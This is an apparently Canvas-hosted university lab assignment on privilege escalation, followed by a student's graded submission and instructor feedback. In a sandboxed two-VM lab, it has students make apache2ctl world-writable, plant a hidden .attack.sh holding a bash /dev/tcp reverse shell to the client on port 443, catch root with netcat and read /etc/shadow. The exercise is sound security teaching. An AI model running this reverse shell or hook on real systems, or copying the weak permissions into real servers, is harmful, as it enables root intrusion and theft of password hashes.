# Unit 4: Lab - Privilege Escalation

**Due:** 2022-02-07T05:59:00Z
**Points Possible:** 32.0
**Submission Types:** online_upload

## Instructions

Update: An alternative platform to complete the lab. 

Some students were unable to set up or restore a vPark (GENI) environment for this lab. I am providing an alternative platform for you to complete the lab. I have deployed all our labs in this semester (except for lab 1) on the Practice Cloud Store (https://store.edaas.net). All the labs (except for lab 1) in this semester are included in the "Cybersecurity I (5 Labs)" training course. Although the web page shows the course price as $0.99 (the minimum can be set on this platform), you don't need to pay for that lab. Instead, simply register an account and log in the system. Once you log in, you will find the course on your account. Regarding how to use the platform, please refer to the video embedded in the About Us page (https://store.edaas.net/product/findNewContact).

The name of this lab on the Practice cloud is called Privilege Escalation (Free).

You are free to choose either vPark or Practice Cloud Store. But make sure to complete ONE report document containing the answers of all the required questions listed in the Rubrics. If you are using the Practice Cloud, use the lab instruction on that platform. The instruction can be found by clicking the "View manual" button when entering the lab environment. You don't need the lab instruction on this Canvas page. However, if you are using vPark, please use the instruction on this page. 

The tasks in the two systems (vPark and Practice Cloud) are similar but might be slightly different. Please make sure to read the Rubrics to avoid missing important tasks. If you are using vPark, find the task number marked as "Task X.X in vPark". If you are using the Practice Cloud, find the task number marked as "Task X.X in P.C".

The lab can be non-trivial for some students. Please start the lab as early as possible. Let me know if you have additional questions. Thank you!

================================================

If you are using Practice Cloud, you can stop reading here and log into  [link: https://store.edaas.net] https://store.edaas.net to [link: http://www.thepracticecloud.net]  start the lab. If you are using vPark, please continue reading and use the instructions below. 

Overview

In this lab you will use the GENI lab environment to learn about and perform a basic privilege escalation attack. Privilege escalation is the action of infiltrating a system and granting yourself access privileges higher than what you have with the account/user you gained access to, in order to tamper with the system or files in some way, or to steal or modify stored information. In this lab, you will gain an understanding of how to perform privilege escalation with Apache and a reverse shell.

Lab Environment 

GENI Project: CS335 

RSPEC file:

 [link: https://raw.githubusercontent.com/DrVoyager/vPark/master/rspec/two-nodes/two-nodes-kansas.rspec] ttps://raw.githubusercontent.com/DrVoyager/vPark/master/rspec/two-nodes/two-nodes-kansas.rspec

 [link: https://raw.githubusercontent.com/DrVoyager/vPark/master/rspec/two-nodes/two-nodes-gatech.rspec] https://raw.githubusercontent.com/DrVoyager/vPark/master/rspec/two-nodes/two-nodes-gatech.rspec 

 [link: https://raw.githubusercontent.com/DrVoyager/vPark/master/rspec/two-nodes/two-nodes-missouriu.rspec] https://raw.githubusercontent.com/DrVoyager/vPark/master/rspec/two-nodes/two-nodes-missouriu.rspec

 [link: https://raw.githubusercontent.com/DrVoyager/vPark/master/rspec/two-nodes/two-nodes-ucla.rspec] https://raw.githubusercontent.com/DrVoyager/vPark/master/rspec/two-nodes/two-nodes-ucla.rspec 

 [link: https://raw.githubusercontent.com/DrVoyager/vPark/master/rspec/two-nodes/two-nodes-umkc.rspec] https://raw.githubusercontent.com/DrVoyager/vPark/master/rspec/two-nodes/two-nodes-umkc.rspec

Lab Topology

For this lab, our topology will consist of two hosts. We will have a Client machine, where we set up a listener to receive our reverse shell on, and a Server machine, which we will have Apache server installed on and will be exploiting.

Preparation

This lab will use the GENI environment that you set up in Lab 1(Set up vPark Environment). If you haven’t set up the environment, please refer to the instruction in Lab 1.  

How to resume your Lab desktop? 

If you are using your own Windows computer (not Citrix Virtual Desktop), you will have the Server and Client session saved on your Putty, as follows.

With the saved sessions on PuTTY, exiting and resuming your VNC desktop are easy.

To resume your Client machine desktop, follow the next four steps:

1. Open PuTTY, load the Client session you have saved and click the Open button to connect.

2. Type in the passphrase of your GENI SSH key to log into your VM.

3. In the VM, type in command vncserver   :1 to make sure vnc server is started. Make sure to leave a space between the word vncserver and the colon sign (:). You probably will see a message saying vnc server is already started. That is okay.

4. Open vncviewer, connect with the address 127.0.0.1:5901. You will need to type in the password of the VNC server that you set before. You will get to the resumed desktop.

To resume your Server machine desktop, complete the same four steps as above. However, make sure you use port number 2 and 5902 instead: 1) Open PuTTY and load the Server session you have saved and click Open button to connect. 2) Type in your GENI SSH key passphrase. 3) In the VM, type in command  vncserver   :2 . 4) Open vncviewer, connect with the address 127.0.0.1:5902.  

If you are using Citrix Virtual Desktop or Mac/ Linux Computer 

Server and Client session might not be saved on your Putty. You need to follow the “connect to virtual machine” document in Lab 1 to connect to Client or Server.

How to exit your Lab desktop?

Simply close the PuTTY and VNC viewer.

Other issues about the vPark Environment?

For other vPark Environment issues, such as VM is down or Lab Desktop is blank, please check the “vPark Lab Environment FAQ” document.

Task 0 - Setup the vulnerability 

In this lab, we first need to install Apache2 Web Server and simulate the behavior of a careless administrator of the Server, who misconfigured the permission of an Apache service file, which allows a malicious client to perform a privilege escalation attack. 

To do this, go to the Server VM, open the terminal and run the following commands:

A. Install Apache2 Web Server

sudo apt-get update

sudo apt install -y apache2

You will be asked to select "Yes/No" during the installation process. Please select "Yes" and hit Enter.

B. Modify File Permission

sudo chmod 777 /usr/sbin/apache2ctl

sudo chmod go+w /usr

sudo chmod go+w /usr/sbin

apache2ctl is a script that is used to start the Apache web server. Executing the above command make the apache2ctl file vulnerable. Exploiting this file will allow us to gain root access through a reverse shell later. For this lab, the vulnerability has already been configured. In the real world, you would have to count on an administrator having misconfigured a file, and you would only be able to SSH in as a low level user with normal privileges. 

C. Take a screenshot of the apache2ctl vulnerable file and it’s permissions, which you can show using the command ls -l .

D. What’s wrong with this file’s permissions? Explain in a sentence or two. 

E. Find the IP address of the Server machine first. On the Server machine, enter the command ifconfig

and hit Enter. This should list the IP addresses for the different interfaces on your machine. Find the information for the eth1 interface and record the IP address of the Server. (There may be multiple IP addresses listed for each interface. The IP address you need should start with 10.10.x.x, otherwise it is not the correct one.) Take a screenshot to show where you found the IP address of the Server’s machine. Remember that throughout the lab instructions, you need to use this IP address whenever it tells you to use Server's IP address ( or IP_SERVER).

F. Find the IP address of the Client machine. On the Client machine, enter the command ifconfig

and hit Enter. This should list the IP addresses for the different interfaces on your machine. Find the information for the eth1 interface and record the IP address of the Client. (There may be multiple IP addresses listed for each interface. The IP address you need should start with 10.10.x.x, otherwise it is not the correct one.)Take a screenshot to show where you found the IP address of the Client’s machine. Remember that throughout the lab instructions, you need to use this IP address whenever it tells you to use Client's IP address ( or IP_CLIENT).

Task 1 - Setup the low privileged user “tom” 

Then we need to create attacker account "tom", which has a low privilege. Follow the below steps:

Modify the sshd configuration file on the Server machine. On the Server machine, open /etc/ssh/sshd_config file, at the end of the file, add the following lines:

### Enable password authentication for Client
Match Address 10.10.1.1
    PasswordAuthentication yes

Notice that the string “10.10.1.1” should be replaced with the actual Client IP. 

The /etc/ssh/sshd_config file is owned by root. You need to use sudo to open the file so that you can change it. If you are not sure which text editor to use, nano is an easy tool to use. Simply type sudo nano /etc/ssh/sshd_config. If you want to learn more about nano, refer to this  [link: https://www.howtogeek.com/howto/42980/the-beginners-guide-to-nano-the-linux-command-line-text-editor/] web page.

After successfully changing the file, enter the command sudo systemctl restart sshd to make your change take effect.

Enter the command sudo adduser tom to create the low privileged user tom. When asking the password, set it to tom. For other questions, feel free to type in the answer or hit enter to ignore.

Test the account tom by enter command su tom, then type password tom. By typing cd ~, you will reach to the directory of tom.

Take a screenshot first to show you have create the account successfully.  Then type in exit to exit from the tom account. 

Suppose the account tom is assigned to a hacker who owns the machine Client. Now test whether the hacker can access the Server machine by using the assigned account tom. On the Client machine, perform the following steps: Suppose the IP address of the Server machine is IP_ SERVER, on the Client machine type ssh  [link: mailto:tom@IP] tom@IP_SERVER, and type the password tom, you should be able to connect to Server’s machine with account tom.

Take a screenshot to show you have connected to the Server machine through Client machine with account tom.  

Then type in exit to exit from the tom account.

Task 2 - Setup our exploit 

Now that we’ve found a vulnerable file, we can use it in order to escalate our privileges. Notice that the setup of the exploit should be performed by the hacker using account tom from the machine Client, because this is the only account the hacker has on the machine Server. 

We’ll do this by implementing something called a reverse shell. Do some quick research on reverse shells. Write down, in your own words, what a reverse shell is and what it is used for. 

To implement our payload, we will create a script elsewhere on the Server’s machine that contains our command to create our reverse shell. We will write a command inside the vulnerable Apache file that points to this script when Apache starts up.

First we’ll make our attack script. Starting from the Client machine, ssh to the Server machine with the user name tom. (Please follow the step 1.G in order to do so). After logging onto Server with account tom, go to tom’s home directory (enter command cd /home/tom), then enter the command nano .attack.sh. This will create an attack script named  .attack.sh under tom’s home directory.

Enter the following into your attack script. NOTE: Where it says IP_Client, put in the Client’s IP address 
#!/bin/bash
nohup bash -i >&/dev/tcp/IP_CLIENT/443 0>&1 &

Hit Ctrl + O  and then Enter to write your file, then hit Ctrl + X to exit nano. Now we have our exploit set up and ready to go.

We need our script to be executable, so enter the command chmod og+x .attack.sh to grant execution permissions.

Now that we’ve laid the groundwork for our payload, we can modify the vulnerable Apache file and get our reverse shell up and running. First, find the misconfigured file on the Server machine you found in Task 2. After you located it, enter the command  nano  /usr/sbin/apache2ctl

Once you’re in the file, enter the full path of your attack script (/home/tom/.attack.sh) under the first line (#!/bin/sh). After you do that, hit Ctrl + O and then Enter to save the file, then hit Ctrl + X to exit nano. Write a paragraph in your report explaining when this attack script will be executed.

Then type in exit to exit from the tom account.

Task 3 - Execute our exploit

On the Client machine, issue the command sudo nc -lvp 443. This command will start up a netcat listener, listening on port 443 for incoming traffic.

Now on the Server machine, the administrator will start up the Apache server. Enter the command sudo service apache2 start. This should trigger your reverse shell on your Client machine. Sometimes, the apache2 could already be started. You can enter the command sudo service apache2 stop first, repeat step A again and then enter sudo service apache2 start to trigger the start procedure.

On your Client machine, verify that you have access to a reverse shell. Enter the command  whoami and take a screenshot of the output.

Also, enter the command cat /etc/shadow and take a screenshot of the output. Answer what the hacker can do with this file. 

Task 4 - Summary 

Write a paragraph discussing what is the main reason for this attack and how do you mitigate this vulnerability. Looking back to Step 0.B and understanding the modified permission of the apache2ctl vulnerable file will help you to answer this question.

Reflection: Write a paragraph describing what you have learned from this lab and what difficulties you had during the lab.  

Submission 

Create and submit a detailed lab report to answer the questions in the instructions. The questions that are required to be answered include: Task 0C, Task 0D, Task 0E, Task 0F, Task 1E, Task 1H, Task 2, Task 2F, Task 3C, Task 3D, Task 4A, Task 4B.

Due Dates

Complete all steps before Sunday midnight.

Unit Learning Outcomes Reflected in Assignment

Explain and Experiment with privilege escalation attack. (CLO 4)

---

## My Submission

**Score:** 29.0/32.0
**Grade:** 29
**Submitted:** 2022-02-07T00:05:24Z

### Submitted Files

- **lab4.docx**
  - Downloaded: `files/lab4.docx`

### Instructor Feedback

**Bert** (2022-02-07T00:05:25Z):

> The  command, if I remember correctly was 'sudo service apache2 start' and it produced an error. I provided the screenshots and documentation in the assignment. I tried restarting the server VM with no luck. Let me know if you want me to redo that section.

**[INSTRUCTOR]** (2022-02-08T17:40:23Z):

> The description shows you are clear about what to do. The reason that the apache server does not start successfully is probably because you corrupt the apache start script. Check the video to find out where goes wrong:

https://drive.google.com/file/d/1AZAqMhj9eR2AchidMAkffCs6B33xWl6_/view?usp=sharing

https://drive.google.com/file/d/1fFi-2VQzUUXNaHrmGuZwX4Uv6t9hirYV/view?usp=sharing
